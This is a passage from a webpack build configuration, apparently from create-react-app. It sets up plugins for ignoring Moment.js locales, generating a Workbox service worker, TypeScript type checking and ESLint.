      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin({
        resourceRegExp: /^\.\/locale$/,
        contextRegExp: /moment$/,
      }),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the webpack build.
      isEnvProduction &&
        fs.existsSync(swSrc) &&
        new WorkboxWebpackPlugin.InjectManifest({
          swSrc,
          dontCacheBustURLsMatching: /\.[0-9a-f]{8}\./,
          exclude: [/\.map$/, /asset-manifest\.json$/, /LICENSE/],
          // Bump up the default maximum size (2mb) that's precached,
          // to make lazy-loading failure scenarios less likely.
          // See https://github.com/cra-template/pwa/issues/13#issuecomment-722667270
          maximumFileSizeToCacheInBytes: 5 * 1024 * 1024,
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          async: isEnvDevelopment,
          typescript: {
            typescriptPath: resolve.sync('typescript', {
              basedir: paths.appNodeModules,
            }),
            configOverwrite: {
              compilerOptions: {
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                skipLibCheck: true,
                inlineSourceMap: false,
                declarationMap: false,
                noEmit: true,
                incremental: true,
                tsBuildInfoFile: paths.appTsBuildInfoFile,
              },
            },
            context: paths.appPath,
            diagnosticOptions: {
              syntactic: true,
            },
            mode: 'write-references',
            // profile: true,
          },
          issue: {
            // This one is specifically to match during CI tests,
            // as micromatch doesn't match
            // '../cra-template-typescript/template/src/App.tsx'
            // otherwise.
            include: [
              { file: '../**/src/**/*.{ts,tsx}' },
              { file: '**/src/**/*.{ts,tsx}' },
            ],
            exclude: [
              { file: '**/src/**/__tests__/**' },
              { file: '**/src/**/?(*.){spec|test}.*' },
              { file: '**/src/setupProxy.*' },
              { file: '**/src/setupTests.*' },
            ],
          },
          logger: {
            infrastructure: 'silent',
          },
        }),
      !disableESLintPlugin &&
        new ESLintPlugin({
          // Plugin options
          extensions: ['js', 'mjs', 'jsx', 'ts', 'tsx'],
          formatter: require.resolve('react-dev-utils/eslintFormatter'),
          eslintPath: require.resolve('eslint'),
          failOnError: !(isEnvDevelopment && emitErrorsAsWarnings),
          context: paths.appSrc,
          cache: true,
          cacheLocation: path.resolve(
            paths.appNodeModules,
            '.cache/.eslintcache'
          ),
          // ESLint class options
          cwd: paths.appPath,
          resolvePluginsRelativeTo: __dirname,
          baseConfig: {
            extends: [require.resolve('eslint-config-react-app/base')],
            rules: {
              ...(!hasJsxRuntime && {
                'react/react-in-jsx-scope': 'error',
              }),
            },
          },
        }),
    ].filter(Boolean),
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};
